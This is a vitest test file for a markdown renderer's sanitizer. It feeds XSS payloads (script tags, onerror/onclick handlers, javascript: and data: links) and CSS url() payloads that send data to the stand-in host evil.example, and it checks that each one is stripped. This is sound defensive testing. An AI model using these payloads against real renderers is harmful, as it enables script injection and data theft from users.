import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

const dom = (html: string): HTMLElement => {
  const el = document.createElement('div')
  el.innerHTML = html
  return el
}

describe('renderMarkdown', () => {
  it('renders GFM tables and task lists', () => {
    const src = ['| a | b |', '|---|---|', '| 1 | 2 |', '', '- [x] done', '- [ ] todo'].join('\n')
    const el = dom(renderMarkdown(src))
    expect(el.querySelector('table thead th')?.textContent).toBe('a')
    expect(el.querySelector('table tbody td')?.textContent).toBe('1')
    const items = el.querySelectorAll('li.task-list-item')
    expect(items).toHaveLength(2)
    expect(items[0].querySelector('.task-box.done')).not.toBeNull()
    expect(items[1].querySelector('.task-box')).not.toBeNull()
    expect(items[1].querySelector('.task-box.done')).toBeNull()
    expect(items[1].textContent?.trim()).toBe('todo')
  })

  it('strips script tags and on* handlers', () => {
    const html = renderMarkdown('hi <script>alert(1)</script><span onclick="alert(2)" onmouseover="x()">x</span><img src=x onerror=alert(3)>')
    expect(html).not.toMatch(/<script/i)
    expect(html).not.toMatch(/onclick|onmouseover|onerror/i)
    expect(html).not.toMatch(/<img/i)
    expect(dom(html).querySelector('span')?.textContent).toBe('x')
  })

  it('adds target _blank and rel to links', () => {
    const el = dom(renderMarkdown('see [docs](https://example.com) and https://openrouter.ai'))
    const links = el.querySelectorAll('a')
    expect(links).toHaveLength(2)
    for (const a of links) {
      expect(a.getAttribute('target')).toBe('_blank')
      expect(a.getAttribute('rel')).toBe('noopener noreferrer')
    }
  })

  it('keeps allowed inline styles', () => {
    const el = dom(renderMarkdown('a <span style="color: #c96; font-style: italic">warm</span> word'))
    const span = el.querySelector('span')
    expect(span?.getAttribute('style')).toBe('color: #c96; font-style: italic')
  })

  it('keeps a tinted recipe card', () => {
    const style = 'background: rgba(200, 150, 100, 0.12); border: 1px solid #c96; border-radius: 14px; padding: 12px 16px; font-family: "Newsreader Variable", serif'
    const el = dom(renderMarkdown(`<div style='${style}'>For the pot</div>`))
    expect(el.querySelector('div')?.getAttribute('style')).toBe(style)
  })

  it.each([
    'background-image: url(https://evil.example/?d=secret)',
    'background: url(https://evil.example/?d=secret)',
    'background: URL("https://evil.example/?d=secret")',
    'background: u\\72 l(https://evil.example/?d=secret)',
    'background: image-set("https://evil.example/a.png" 1x)',
    'color: red; background: url("a;b")',
    'border-image: url(https://evil.example/a.png)',
    'list-style-image: url(https://evil.example/a.png)',
    'cursor: url(https://evil.example/a.png), auto',
    'font-family: url(https://evil.example/a.woff)',
  ])('cannot load anything through style: %s', (style) => {
    const html = renderMarkdown(`<span style='${style}'>x</span>`)
    expect(html).not.toMatch(/evil\.example|url\(/i)
    expect(dom(html).querySelector('span')?.textContent).toBe('x')
  })

  it('keeps the safe declarations next to a dropped one', () => {
    const el = dom(renderMarkdown(`<span style='color: red; background: url(https://evil.example/a); font-weight: 600'>x</span>`))
    expect(el.querySelector('span')?.getAttribute('style')).toBe('color: red; font-weight: 600')
  })

  it.each([
    'position: fixed',
    'inset: 0',
    'z-index: 9999',
    'display: none',
    'display: flex',
    'margin: -500px',
    'font-size: 900px',
    'color: red !important',
  ])('drops what could cover or hijack the app: %s', (style) => {
    const el = dom(renderMarkdown(`<div style='${style}'>x</div>`))
    expect(el.querySelector('div')?.hasAttribute('style')).toBe(false)
  })

  it('strips in-page hash links so they cannot change the route', () => {
    const el = dom(renderMarkdown('note[^1] and <a href="#/c/other">other chat</a>\n\n[^1]: the footnote'))
    for (const a of el.querySelectorAll('a')) expect(a.hasAttribute('href')).toBe(false)
    expect(el.textContent).toContain('other chat')
    expect(el.textContent).toContain('the footnote')
  })

  it('strips javascript: and data: links', () => {
    const el = dom(renderMarkdown('<a href="javascript:alert(1)">js</a> <a href="data:text/html,<b>x</b>">data</a> [md](javascript:alert(2))'))
    for (const a of el.querySelectorAll('a')) {
      const href = a.getAttribute('href') ?? ''
      expect(href).not.toMatch(/^\s*(javascript|data):/i)
    }
    expect(el.textContent).toContain('js')
  })
})
